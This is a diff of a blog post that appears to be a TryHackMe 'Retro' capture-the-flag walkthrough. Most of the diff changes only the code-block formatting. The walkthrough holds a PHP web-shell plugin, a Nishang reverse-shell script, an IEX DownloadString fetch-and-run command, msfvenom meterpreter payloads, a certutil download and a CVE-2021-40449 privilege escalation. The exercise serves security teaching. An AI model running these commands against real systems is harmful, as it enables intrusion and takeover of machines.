@@ -26,8 +26,7 @@ I can't think of a Retro pun.  Let's get started.
 
 Run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.70.158
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 23:00 AEDT
@@ -73,14 +72,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 44.25 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 To start, when there is a web server, run curl -I to try and fingerprint the technology.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ curl -I 10.10.70.158        
 HTTP/1.1 200 OK
@@ -91,8 +89,8 @@ Accept-Ranges: bytes
 ETag: "bfffe59b22aed51:0"
 Server: Microsoft-IIS/10.0
 Date: Thu, 27 Feb 2025 12:12:01 GMT
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -106,10 +104,7 @@ Check the landing page the webserver is serving.
 <br />
 Check the landing page source code.  Even though it is the default page, there might be something sneaky.
 
-{% raw %}
-```html
-view-source:http://10.10.70.158/
-
+{% capture landingsource %}
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -142,14 +137,13 @@ a img {
 </div>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.70.158/' content=landingsource %}
 
 <br />
 Give the server a ffuf to try and discover something interesting.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.70.158/FUZZ -e .txt,.bak,.html -fs 703
 
@@ -177,8 +171,8 @@ ________________________________________________
 
 retro                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 323ms]
 Retro                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 311ms]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Check the /retro directory and note the possible user name.
@@ -237,14 +231,13 @@ Test the RCE exploit.  Remember to dir instead of ls, since it is a Windows mach
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use the revshells to generate a payload.  Try putting it in the cmd parameter.  It fails.
@@ -259,18 +252,16 @@ Use the revshells to generate a payload.  Try putting it in the cmd parameter.  
 <br />
 Copy the Invoke-PowerShellTcp.ps1 into the local working folder.
 
-{% raw %}
-```powershell
+{% capture cppowershell %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ cp $(locate Invoke-PowerShellTcp.ps1) .
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cppowershell %}
 
 <br />
 Update the script to invoke the method.
 
-{% raw %}
-```bash
+{% capture upshellscript %}
 function Invoke-PowerShellTcp 
 { 
 <#
@@ -299,30 +290,28 @@ The script is derived from Powerfun written by Ben Turner & Dave Hardy
     }
 }
 Invoke-PowerShellTcp -Reverse -IPAddress 10.4.119.29 -Port 4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=upshellscript %}
 
 <br />
 Start a listener on 4444.  Kill the 443 listener if it is still listening.  You will forget about it, try to start another one later, get an error, and be serverly frustrated.
 
-{% raw %}
-```powershell
+{% capture start4444listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ nc -nlvp 4444    
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start4444listener %}
 
 <br />
 Start a web server to server the Nishang.
 
-{% raw %}
-```powershell
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Use PowerShell to execute the script.
@@ -333,33 +322,36 @@ Use PowerShell to execute the script.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture downloadexecute %}
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.4.119.29:8000/Invoke-PowerShellTcp.ps1')"
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=downloadexecute %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catch4444shell %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ nc -nlvp 4444    
 listening on [any] 4444 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.174.155] 49917
+{% endcapture %}
+
+{% capture windows4444shell %}
 Windows PowerShell running as user RETROWEB$ on RETROWEB
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catch4444shell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=windows4444shell %}
 
 <br />
 Run whoami and whoami /priv to see who we are and the privileges that we have.
 
-{% raw %}
-```bash
+{% capture whoamis %}
 PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> whoami
 nt authority\iusr
 PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> whoami /priv
@@ -372,14 +364,13 @@ Privilege Name          Description                               State
 SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
 SeImpersonatePrivilege  Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege Create global objects                     Enabled
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=whoamis %}
 
 <br />
 Run systeminfo and get an idea of the system that we are on.
 
-{% raw %}
-```bash
+{% capture systeminfo %}
 PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> systeminfo
 
 Host Name:                 RETROWEB
@@ -423,14 +414,13 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.174.155
                                  [02]: fe80::3cfb:8dab:bb43:ba18
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=systeminfo %}
 
 <br />
 At this point, let's try different exploits.  Kill this shell and let's start over.  Create a vulnerable plugin.
 
-{% raw %}
-```php
+{% capture shellphp %}
 <?php
 /**
  * Plugin Name: Shelly
@@ -443,19 +433,18 @@ At this point, let's try different exploits.  Kill this shell and let's start ov
 system($_GET['cmd']);
 
 ?> 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='shell.php' content=shellphp %}
 
 <br />
 Let's zip that payload up.
 
-{% raw %}
-```bash
+{% capture zipshellphp %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ zip shell.zip shell.php 
   adding: shell.php (deflated 14%)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=zipshellphp %}
 
 <br />
 From the Add Item in the plugins menu, click upload plugin.
@@ -487,24 +476,28 @@ Execute the Nishang like we did earlier.
 <br />
 Check the listener and catch the shell...again.  Kill it to free up the port.
 
-{% raw %}
-```bash
+{% capture catchanothershell %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.212.193] 50239
+{% endcapture %}
+
+{% capture anotherwindowsshell %}
 Windows PowerShell running as user RETROWEB$ on RETROWEB
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\inetpub\wwwroot\retro\wp-content\plugins\shell>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchanothershell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=anotherwindowsshell %}
 
 <br />
 Let's test credential reuse in the RDP service that is also open.
 
-{% raw %}
-```bash
+{% capture xfreerdp %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ xfreerdp /u:Wade /p:parzival /v:10.10.87.202 /dynamic-resolution +clipboard
 [13:54:58:957] [635743:635748] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
@@ -528,8 +521,8 @@ Please look at the OpenSSL documentation on how to add a private CA to the store
 Do you trust the above certificate? (Y/T/N) Y
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=xfreerdp %}
 
 <br />
 Check the recycle bin.
@@ -543,8 +536,7 @@ Check the recycle bin.
 <br />
 Get the user.txt.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 C:\Users\Wade\Desktop>type user.txt.txt
 <redacted>
 C:\Users\Wade\Desktop>ipconfig
@@ -571,8 +563,8 @@ Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Check the Bookmarks in Chrome.
@@ -650,8 +642,7 @@ Set IE as the default browser.  Still get the same error as before.
 <br />
 Create a x64 meterpreter executable binary.
 
-{% raw %}
-```bash
+{% capture generatemeterpreterpayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=443 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -664,14 +655,13 @@ Saved as: meter.exe
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=generatemeterpreterpayload %}
 
 <br />
 Start a multi/handler.  Set the payload, lhost, and lport.
 
-{% raw %}
-```bash
+{% capture msfconsolestart %}
 ┌──(kali㉿kali)-[~/Documents/thm/retro]
 └─$ msfconsole -q
 msf6 > use exploit/multi/handler
@@ -686,14 +676,13 @@ msf6 exploit(multi/handler) > set lport 443
 lport => 443
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:443
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfconsolestart %}
 
 <br />
 From the RDP session, transfer to the victim machine.
 
-{% raw %}
-```bash
+{% capture transfermeterpreter %}
 C:\Windows\system32>cd C:\Users\Wade\Desktop
 
 C:\Users\Wade\Desktop>certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
@@ -701,28 +690,26 @@ C:\Users\Wade\Desktop>certutil.exe -urlcache -f http://10.4.119.29:8000/meter.ex
 CertUtil: -URLCache command completed successfully.
 
 C:\Users\Wade\Desktop>.\meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transfermeterpreter %}
 
 <br />
 Check the handler and catch the session.
 
-{% raw %}
-```bash
+{% capture runmeterexploit %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:443 
 [*] Sending stage (203846 bytes) to 10.10.234.200
 [*] Meterpreter session 1 opened (10.4.119.29:443 -> 10.10.234.200:49848) at 2025-03-22 22:37:45 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runmeterexploit %}
 
 <br />
 Run ps to get a list of processes.
 
-{% raw %}
-```bash
+{% capture runpslist %}
 meterpreter > ps
 
 Process List
@@ -754,64 +741,23 @@ Process List
  3904  800   ShellExperienceHost.exe  x64   2        RETROWEB\Wade  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
  4300  3020  meter.exe                x64   2        RETROWEB\Wade  C:\Users\Wade\Desktop\meter.exe
  4424  4384  MpCmdRun.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpslist %}
 
 <br />
 Migrate to a process to a process that has the same architecture and user that we are currently.
 
-{% raw %}
-```bash
+{% capture migrate2464 %}
 meterpreter > migrate 2464
 [*] Migrating from 4300 to 2464...
 [*] Migration completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=migrate2464 %}
 
 <br />
 Background the session and run the local exploit suggester.
 
-{% raw %}
-```bash
-meterpreter > ps
-
-Process List
-============
-
- PID   PPID  Name                     Arch  Session  User           Path
- ---   ----  ----                     ----  -------  ----           ----
-
-<snip>
-
- 2096  800   RuntimeBroker.exe        x64   2        RETROWEB\Wade  C:\Windows\System32\RuntimeBroker.exe
- 2188  980   sihost.exe               x64   2        RETROWEB\Wade  C:\Windows\System32\sihost.exe
- 2464  724   svchost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\svchost.exe
- 2728  3820  dwm.exe
- 2732  2468  GoogleUpdate.exe
- 2944  800   SearchUI.exe             x64   2        RETROWEB\Wade  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
- 3020  2096  cmd.exe                  x64   2        RETROWEB\Wade  C:\Windows\System32\cmd.exe
- 3028  988   rdpclip.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\rdpclip.exe
- 3036  1260  csrss.exe
- 3044  676   LogonUI.exe
- 3232  800   dllhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\dllhost.exe
- 3416  3020  conhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\conhost.exe
- 3540  724   svchost.exe
- 3652  724   amazon-ssm-agent.exe
- 3768  920   explorer.exe             x64   2        RETROWEB\Wade  C:\Windows\explorer.exe
- 3812  980   taskhostw.exe            x64   2        RETROWEB\Wade  C:\Windows\System32\taskhostw.exe
- 3820  1260  winlogon.exe
- 3868  4044  MpCmdRun.exe
- 3904  800   ShellExperienceHost.exe  x64   2        RETROWEB\Wade  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
- 4300  3020  meter.exe                x64   2        RETROWEB\Wade  C:\Users\Wade\Desktop\meter.exe
- 4424  4384  MpCmdRun.exe
-```
-{% endraw %}
-
-<br />
-Migrate to a process to a process that has the same architecture and user that we are currently.
-
-{% raw %}
-```bash
+{% capture runexploitsuggester %}
 meterpreter > 
 Background session 1? [y/N]  
 msf6 exploit(multi/handler) > search suggester
@@ -871,14 +817,13 @@ Also please contact the author of logging-2.4.0 to request adding syslog into it
  14  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 
  <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploitsuggester %}
 
 <br />
 Choose to use cve_2021_40449 and set the options.
 
-{% raw %}
-```bash
+{% capture cve202140449setoption %}
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2021_40449
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/local/cve_2021_40449) > set session 1
@@ -888,14 +833,13 @@ lhost => tun0
 msf6 exploit(windows/local/cve_2021_40449) > set lhost tun0
 lhost => tun0
 msf6 exploit(windows/local/cve_2021_40449) >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cve202140449setoption %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```bash
+{% capture cve202140449runexploit %}
 msf6 exploit(windows/local/cve_2021_40449) > exploit
 [*] Started reverse TCP handler on 10.4.119.29:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -908,31 +852,35 @@ msf6 exploit(windows/local/cve_2021_40449) > exploit
 [*] Meterpreter session 2 opened (10.4.119.29:4444 -> 10.10.234.200:49877) at 2025-03-22 22:47:31 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=cve202140449runexploit %}
 
 <br />
 Drop into a shell and confirm who we are.
 
-{% raw %}
-```bash
+{% capture catchadminshell %}
 meterpreter > shell
 Process 4372 created.
 Channel 1 created.
+{% endcapture %}
+
+{% capture windowsadminshell %}
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchadminshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsadminshell %}
 
 <br />
 Get the root.txt.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt.txt
 type C:\Users\Administrator\Desktop\root.txt.txt
 <redacted>
@@ -956,13 +904,15 @@ Tunnel adapter Teredo Tunneling Pseudo-Interface:
    IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:2815:27b8:f5f5:1537
    Link-local IPv6 Address . . . . . : fe80::2815:27b8:f5f5:1537%2
    Default Gateway . . . . . . . . . : ::
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
 
 Tunnel adapter isatap.eu-west-1.compute.internal:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Hopefully, you enjoyed the retro look at the box, Retro.  I will see you in the next one.
